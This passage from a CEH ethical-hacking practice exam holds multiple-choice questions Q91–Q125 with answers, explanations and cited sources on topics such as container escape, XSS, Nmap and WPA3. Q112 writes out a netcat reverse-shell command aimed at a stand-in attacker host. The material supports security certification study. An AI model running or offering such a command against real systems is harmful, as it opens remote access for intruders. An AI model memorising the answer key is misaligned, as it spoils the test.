**Answer:** C
**Explanation:** APTs are sophisticated, long-term attacks typically by nation-states or organized groups, involving multiple phases of network compromise.
**Source:** CEH v13 Study Guide

---

## Q92
**What type of container vulnerability allows an attacker to break out of a container and access the host system?**
- A) Image tampering
- B) Container escape
- C) Registry poisoning
- D) Sidecar injection

**Answer:** B
**Explanation:** Container escape vulnerabilities (e.g., CVE-2019-5736 in runc) allow attackers to break out of container isolation and gain host-level access.
**Source:** CEH v13 Study Guide

---

## Q93
**Which cloud attack exploits misconfigured permissions to gain unauthorized access to resources?**
- A) Side-channel attack
- B) Privilege escalation via IAM misconfiguration
- C) Cryptojacking
- D) DNS hijacking

**Answer:** B
**Explanation:** IAM (Identity and Access Management) misconfigurations, such as overly permissive policies, are among the most common cloud security vulnerabilities.
**Source:** CEH v13 Study Guide

---

## Q94
**In IoT hacking, what is firmware analysis primarily used for?**
- A) Improving device performance
- B) Finding hardcoded credentials and vulnerabilities
- C) Updating the device OS
- D) Monitoring network traffic

**Answer:** B
**Explanation:** Firmware analysis (reverse engineering) extracts and examines firmware images to find hardcoded passwords, API keys, and exploitable vulnerabilities.
**Source:** CEH v13 Study Guide

---

# SECTION 9: ADDITIONAL HIGH-DIFFICULTY QUESTIONS

## Q95
**During a penetration test, you discover a web application that reflects user input in error messages without sanitization. What type of vulnerability is most likely present?**
- A) SQL injection
- B) Reflected XSS
- C) SSRF
- D) XML injection

**Answer:** B
**Explanation:** When user input is reflected back in responses without sanitization, it creates reflected (non-persistent) XSS vulnerabilities.
**Source:** CEH Practice Exam

---

## Q96
**What is the FIRST step an ethical hacker should perform during a penetration test?**
- A) Vulnerability scanning
- B) Exploitation
- C) Passive information gathering
- D) Report writing

**Answer:** C
**Explanation:** EC-Council defines passive information gathering as the first step in the pre-attack phase, before any active scanning or exploitation.
**Source:** Pearson IT Certification

---

## Q97
**Which protocol uses port 161 for queries and port 162 for traps?**
- A) SMTP
- B) SNMP
- C) LDAP
- D) NTP

**Answer:** B
**Explanation:** SNMP (Simple Network Management Protocol) uses UDP 161 for queries and UDP 162 for trap notifications.
**Source:** CEH Study Guide

---

## Q98
**An attacker uses Metasploit to exploit a vulnerable service and obtains a Meterpreter shell. What phase of the ethical hacking methodology is this?**
- A) Reconnaissance
- B) Scanning
- C) Gaining access
- D) Maintaining access

**Answer:** C
**Explanation:** Exploiting a vulnerability to get a shell is the "Gaining Access" phase. Maintaining access would involve establishing persistence.
**Source:** CEH Study Guide

---

## Q99
**Which Nmap scan requires root/admin privileges?**
- A) TCP Connect scan (-sT)
- B) SYN scan (-sS)
- C) Version scan (-sV)
- D) List scan (-sL)

**Answer:** B
**Explanation:** SYN scans require raw socket access, which needs root/admin privileges. TCP connect scans use the OS's connect() system call and don't require elevated privileges.
**Source:** CEH Study Guide

---

## Q100
**What does the term "pivoting" mean in penetration testing?**
- A) Rotating encryption keys
- B) Using a compromised system to attack other systems on the network
- C) Changing attack methodologies
- D) Reporting findings to management

**Answer:** B
**Explanation:** Pivoting uses a compromised system as a relay point to attack other systems on internal networks that aren't directly accessible from outside.
**Source:** CEH Study Guide

---

## Q101
**Which type of firewall operates at Layer 7 of the OSI model and can inspect packet contents?**
- A) Packet-filtering firewall
- B) Stateful inspection firewall
- C) Application-layer firewall
- D) Circuit-level gateway

**Answer:** C
**Explanation:** Application-layer (proxy) firewalls operate at Layer 7, inspecting the actual application data within packets for malicious content.
**Source:** CEH Study Guide

---

## Q102
**An attacker sends a specially crafted DNS response to a caching DNS server, replacing legitimate records. What attack is this?**
- A) DNS tunneling
- B) DNS cache poisoning
- C) DNS zone transfer
- D) DNS amplification

**Answer:** B
**Explanation:** DNS cache poisoning injects fraudulent DNS records into a resolver's cache, redirecting users to attacker-controlled servers.
**Source:** CEH Study Guide

---

## Q103
**Which encryption mode in WPA3 provides individualized data encryption even on open networks?**
- A) SAE (Simultaneous Authentication of Equals)
- B) OWE (Opportunistic Wireless Encryption)
- C) TKIP
- D) CCMP

**Answer:** B
**Explanation:** OWE (Opportunistic Wireless Encryption) provides encryption on open networks without requiring a password, using Diffie-Hellman key exchange.
**Source:** CEH v13 Study Guide

---

## Q104
**What WPA3 feature replaces WPA2's PSK (Pre-Shared Key) authentication?**
- A) TKIP
- B) SAE (Simultaneous Authentication of Equals)
- C) EAP
- D) PEAP

**Answer:** B
**Explanation:** SAE (also known as Dragonfly) replaces PSK, providing protection against offline dictionary attacks and perfect forward secrecy.
**Source:** CEH v13 Study Guide

---

## Q105
**During a mobile penetration test, which tool would you use to analyze Android application packages?**
- A) Wireshark
- B) APKTool
- C) Aircrack-ng
- D) Nikto

**Answer:** B
**Explanation:** APKTool reverse-engineers Android APK files, allowing analysis of source code, resources, and manifest files for vulnerabilities.
**Source:** CEH Study Guide

---

## Q106
**Which attack targets the authentication process in Bluetooth by forcing devices to use a weaker encryption key?**
- A) Bluesnarfing
- B) KNOB (Key Negotiation of Bluetooth) attack
- C) Bluejacking
- D) Bluesmacking

**Answer:** B
**Explanation:** The KNOB attack forces Bluetooth devices to negotiate a weaker encryption key, making it possible to brute-force the key and intercept communications.
**Source:** CEH v13 Study Guide

---

## Q107
**What type of attack involves an attacker creating a fake cell tower to intercept mobile communications?**
- A) Evil twin attack
- B) IMSI catcher / Stingray attack
- C) War driving
- D) Bluetooth sniffing

**Answer:** B
**Explanation:** IMSI catchers (Stingrays) impersonate cell towers to intercept mobile communications, track locations, and perform MITM attacks.
**Source:** CEH Study Guide

---

## Q108
**Which tool is specifically designed for web server vulnerability scanning?**
- A) Nmap
- B) Nikto
- C) Metasploit
- D) Wireshark

**Answer:** B
**Explanation:** Nikto is an open-source web server scanner that tests for dangerous files, outdated server software, and server misconfigurations.
**Source:** CEH Study Guide

---

## Q109
**What is the primary difference between a vulnerability scan and a penetration test?**
- A) Vulnerability scans are automated; pen tests are always manual
- B) Vulnerability scans identify potential weaknesses; pen tests actively exploit them
- C) Pen tests only check for known vulnerabilities
- D) There is no difference

**Answer:** B
**Explanation:** Vulnerability scanning identifies and reports potential vulnerabilities, while penetration testing goes further by actively attempting to exploit them to assess real-world impact.
**Source:** CEH Study Guide

---

## Q110
**An attacker uses an XSS vulnerability to steal a session cookie and impersonate the victim. What type of session hijacking is this?**
- A) Network-level hijacking
- B) Application-level hijacking
- C) Blind hijacking
- D) Brute force hijacking

**Answer:** B
**Explanation:** Stealing session cookies through XSS is an application-level session hijacking technique operating at the web application layer.
**Source:** CEH Study Guide

---

## Q111
**What type of IDS monitors network traffic for suspicious patterns?**
- A) HIDS (Host-based IDS)
- B) NIDS (Network-based IDS)
- C) WIDS (Wireless IDS)
- D) File Integrity Monitor

**Answer:** B
**Explanation:** NIDS monitors network traffic passing through network segments, analyzing packets for known attack signatures or anomalous behavior.
**Source:** CEH Study Guide

---

## Q112
**Which command creates a reverse shell using Netcat?**
- A) nc -l -p 4444
- B) nc -e /bin/bash attacker_ip 4444
- C) nc -z target_ip 1-1024
- D) nc -v target_ip 80

**Answer:** B
**Explanation:** `nc -e /bin/bash` sends a shell to the attacker's listening Netcat instance, creating a reverse connection.
**Source:** CEH Study Guide

---

## Q113
**What does the acronym CVE stand for?**
- A) Common Vulnerability Exploits
- B) Common Vulnerabilities and Exposures
- C) Certified Vulnerability Enumeration
- D) Critical Vulnerability Events

**Answer:** B
**Explanation:** CVE (Common Vulnerabilities and Exposures) is a standardized list of publicly known cybersecurity vulnerabilities maintained by MITRE.
**Source:** CEH Study Guide

---

## Q114
**During an engagement, you find a login page. Which tool would be MOST appropriate for testing it against common credentials?**
- A) Nmap
- B) Hydra
- C) Wireshark
- D) Burp Suite

**Answer:** B
**Explanation:** Hydra is a fast network logon cracker supporting many protocols (HTTP, FTP, SSH, etc.) for brute-forcing login credentials.
**Source:** CEH Study Guide

---

## Q115
**What is the purpose of the MITRE ATT&CK framework?**
- A) To encrypt communications
- B) To document adversary tactics, techniques, and procedures
- C) To scan for vulnerabilities
- D) To manage firewall rules

**Answer:** B
**Explanation:** MITRE ATT&CK is a knowledge base of adversary TTPs (Tactics, Techniques, and Procedures) based on real-world observations, used for threat modeling and detection.
**Source:** CEH v13 Study Guide

---

## Q116
**Which phase of the Cyber Kill Chain involves the attacker delivering the weaponized payload to the victim?**
- A) Reconnaissance
- B) Weaponization
- C) Delivery
- D) Exploitation

**Answer:** C
**Explanation:** The Delivery phase transmits the weaponized payload to the target via email, USB, web, etc. Weaponization creates the payload; Exploitation activates it.
**Source:** CEH Study Guide

---

## Q117
**What is the difference between symmetric and asymmetric encryption?**
- A) Symmetric uses two keys; asymmetric uses one
- B) Symmetric uses one shared key; asymmetric uses a public/private key pair
- C) Symmetric is slower than asymmetric
- D) There is no difference

**Answer:** B
**Explanation:** Symmetric encryption uses the same key for encrypt/decrypt (faster, used for bulk data). Asymmetric uses a public/private key pair (slower, used for key exchange and signatures).
**Source:** CEH Study Guide

---

## Q118
**Which tool captures and analyzes network packets in real-time?**
- A) Nmap
- B) Wireshark
- C) Metasploit
- D) John the Ripper

**Answer:** B
**Explanation:** Wireshark is the industry-standard packet capture and protocol analysis tool.
**Source:** CEH Study Guide

---

## Q119
**What does the TCP flag combination SYN+ACK indicate?**
- A) Connection request
- B) Connection accepted / port is open
- C) Connection terminated
- D) Data transfer in progress

**Answer:** B
**Explanation:** SYN+ACK is the second step of the TCP three-way handshake, indicating the port is open and the server accepted the connection request.
**Source:** CEH Study Guide

---

## Q120
**An attacker uses Responder.py on a Windows network. What is the attacker most likely capturing?**
- A) Wireless packets
- B) NTLMv2 hashes via LLMNR/NBT-NS poisoning
- C) SSL certificates
- D) DNS zone transfers

**Answer:** B
**Explanation:** Responder.py poisons LLMNR, NBT-NS, and MDNS requests on Windows networks to capture NTLMv2 authentication hashes.
**Source:** CEH v13 Study Guide

---

## Q121
**What is the primary purpose of a Web Application Firewall (WAF)?**
- A) Block all HTTP traffic
- B) Filter and monitor HTTP traffic between a web application and the internet
- C) Encrypt web traffic
- D) Manage DNS records

**Answer:** B
**Explanation:** A WAF protects web applications by filtering, monitoring, and blocking malicious HTTP/HTTPS traffic (SQL injection, XSS, etc.).
**Source:** CEH Study Guide

---

## Q122
**Which of the following BEST describes a "living off the land" (LOLBin) attack?**
- A) Using custom malware
- B) Using legitimate system tools for malicious purposes
- C) Physical break-in
- D) Social engineering

**Answer:** B
**Explanation:** LOLBin attacks use built-in OS tools (PowerShell, certutil, wmic, etc.) to perform malicious actions, evading signature-based detection.
**Source:** CEH v13 Study Guide

---

## Q123
**What does EDR stand for and what is its primary function?**
- A) Endpoint Detection and Response — monitors endpoints for threats and automates response
- B) Enhanced Data Recovery — recovers deleted files
- C) External DNS Resolution — resolves external domains
- D) Encrypted Data Relay — encrypts endpoint traffic

**Answer:** A
**Explanation:** EDR (Endpoint Detection and Response) continuously monitors endpoints, detects suspicious activity, and provides automated/manual response capabilities.
**Source:** CEH v13 Study Guide

---

## Q124
**In CEH v13, what new tool category was added for AI-driven vulnerability assessment?**
- A) Traditional port scanners
- B) AI-powered automated scanners that use ML for smarter detection
- C) Manual code review tools
- D) Physical security assessment tools

**Answer:** B
**Explanation:** CEH v13 introduces AI-powered vulnerability assessment tools that use machine learning to improve detection accuracy and reduce false positives.
**Source:** CEH v13 Curriculum / InfoSecTrain

---

## Q125
**Which regulation requires organizations to report data breaches involving EU citizens' personal data within 72 hours?**
- A) HIPAA
- B) GDPR
- C) PCI-DSS
- D) SOX

**Answer:** B
**Explanation:** GDPR (General Data Protection Regulation) requires breach notification to supervisory authorities within 72 hours of discovery.
**Source:** CEH Study Guide

---

# SOURCES

- Pearson IT Certification - CEH Cert Guide (pearsonitcertification.com)
- Matt Walker - CEH Certified Ethical Hacker All-in-One Exam Guide
- ExamTopics - ECCouncil 312-50v13 Practice Tests (examtopics.com)
- CehTest.com - CEH Practice Questions
- Pass4Success - EC-Council 312-50 Practice Exam
- InfoSecTrain - CEH v13 AI Study Material (infosectrain.com)
- EC-Council Official CEH v13 Curriculum (eccouncil.org)
- GitHub: ryh04x/CEH-Exam-Questions
- GitHub: Samsar4/CEH-v10-Study-Guide
- EduSum - EC-Council CEH Sample Questions (edusum.com)
- OWASP Top 10 for AI (referenced in CEH v13)
